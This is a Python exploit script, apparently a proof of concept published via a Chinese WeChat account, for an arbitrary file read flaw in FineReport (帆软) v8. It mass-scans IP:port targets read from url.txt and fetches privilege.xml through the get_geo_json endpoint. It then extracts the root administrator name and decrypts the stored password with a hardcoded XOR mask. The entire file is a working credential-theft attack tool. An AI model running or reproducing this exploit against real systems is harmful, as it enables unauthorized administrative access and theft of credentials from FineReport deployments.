import requests
import sys
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[31m公众号: 深夜笔记本                                     \033[0m')
    print('+  \033[31m版本: 帆软v8任意文件读取                                      \033[0m')
    print('+  \033[31m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[31mUrl       >>>http://xxx.xxx.xxx.xxx                            \033[0m')
    print('+------------------------------------------')
a = []
def decode_passwd(cipher):
    PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23]  # 掩码
    Password = ""
    cipher = cipher[3:]  # 截断三位后
    for i in range(int(len(cipher) / 4)):
        c1 = int("0x" + cipher[i * 4:(i + 1) * 4], 16)
        c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8]
        Password = Password + chr(c2)
    return Password

def POC_1(target_url):
    vuln_url_1 = target_url + '/WebReport/ReportServer'
    vuln_url_2 = target_url + '/ReportServer'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response_1 = requests.get(url=vuln_url_1, timeout=5, verify=False, headers=headers)
        response_2 = requests.get(url=vuln_url_2, timeout=5, verify=False, headers=headers)
        if "部署页面" in response_1.text:
            print("\033[32m[o] 目标部署页面为: {} \033[0m".format(vuln_url_1))
            POC_2(vuln_url_1)
        elif "部署页面" in response_2.text:
            print("\033[32m[o] 目标部署页面为: {} \033[0m".format(vuln_url_2))
            POC_2(vuln_url_2)
        else:
            print("\033[31m[x] 目标漏洞无法利用 \033[0m")
    except Exception as e:
        print("\033[31m[x] 目标漏洞无法利用 {} \033[0m".format(e))
    return

def POC_2(vuln_url_fileread):
    vuln_url = vuln_url_fileread + "?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, verify=False, timeout=5)
        print("\033[32m[o] 正在访问: {} \033[0m".format(vuln_url))
        if "rootManagerPassword" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标存在漏洞,读取敏感文件 \n{} \033[0m".format(response.text))
            user_name = re.findall(r'<!\[CDATA\[(.*?)]]></rootManagerName>', response.text)
            cipher = re.findall(r'<!\[CDATA\[(.*?)]]></rootManagerPassword>', response.text)
            password = decode_passwd(cipher[0])
            print("\033[34m[o] 后台账户密码为:{} {} \033[0m".format(user_name[0], password))
        else:
            print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))

if __name__ == '__main__':
    title()
    with open('url.txt', 'r', encoding='utf-8') as f:
        g = f.read()
    a = re.findall('\d{1,3}[.]\d{1,3}[.]\d{1,3}[.]\d{1,3}[:]\d+', g)
    for i in a:
        if 'http' in i:
            target_url = str(i)
        else:
            target_url = 'http://' + str(i)
        POC_1(target_url)